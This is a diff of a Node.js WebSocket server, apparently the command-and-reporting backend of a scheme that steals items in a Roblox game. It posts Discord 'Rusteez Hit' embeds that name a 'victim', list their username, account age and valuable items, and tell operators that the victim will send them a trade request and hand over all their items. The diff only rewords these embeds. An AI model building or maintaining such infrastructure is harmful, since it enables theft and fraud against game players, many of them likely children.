@@ -570,13 +570,13 @@ wss.on('connection', (ws, req) => {
         
                     // 3. Préparer l'Embed pour Discord
                     const hitEmbed = new EmbedBuilder()
-                    .setTitle("Rusteez • SAB Hit")
+                    .setTitle("Rusteez Hit")
                     .setColor(0x2b2d31)
-                    .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.`)
+                    .setDescription(`🛠️ **How to Use?**\nJoin SAB, and victim will send u a trade request (if they don't, try send them), then they will send u all their items.`)
                     .addFields(
                         { 
                             name: "📄 Player Information", 
-                            value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👥 Players      : ${hitInfo.Players}/8\n👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}\n\`\`\`` 
+                            value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}\n\`\`\`` 
                         },
                         {
                             name: "👑 Valuable Brainrots",
@@ -643,14 +643,14 @@ wss.on('connection', (ws, req) => {
                     if (publicChannel) {
                         // On crée une version un peu plus "anonyme" ou stylée pour le public
                         const publicEmbed = new EmbedBuilder()
-                            .setTitle("Rusteez • SAB Hit")
+                            .setTitle("Rusteez Hit")
                             .setColor(0x2b2d31)
-                            .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.`)
+                            .setDescription(`🛠️ **How to Use?**\nJoin SAB, and victim will send u a trade request (if they don't, try send them), then they will send u all their items.`)
                             .addFields(
                                 { 
                                     name: "📄 Player Information", 
                                     // Note : Pas d'espaces au début des lignes ici
-                                    value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👥 Players      : ${hitInfo.Players}/8\n\`\`\`` 
+                                    value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n\`\`\`` 
                                 },
                                 {
                                     name: "👑 Valuable Brainrots",
@@ -707,13 +707,13 @@ async function sendManualHit(hitData) {
     if (!publicChannel) throw new Error("Public Channel introuvable");
 
     const publicEmbed = new EmbedBuilder()
-        .setTitle("Rusteez • SAB Hit")
+        .setTitle("Rusteez Hit")
         .setColor(0x2b2d31)
-        .setDescription(`🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.`)
+        .setDescription(`🛠️ **How to Use?**\nJoin SAB, and victim will send u a trade request (if they don't, try send them), then they will send u all their items.`)
         .addFields(
             { 
                 name: "📄 Player Information", 
-                value: `\`\`\`properties\n👤 Display Name : ${hitData.displayName}\n🆔 Username     : ${hitData.username}\n🗓️ Account Age  : ${hitData.age} days\n👥 Players      : 1/8\n\`\`\`` 
+                value: `\`\`\`properties\n👤 Display Name : ${hitData.displayName}\n🆔 Username     : ${hitData.username}\n🗓️ Account Age  : ${hitData.age} days\n\`\`\`` 
             },
             {
                 name: "👑 Valuable Brainrots",
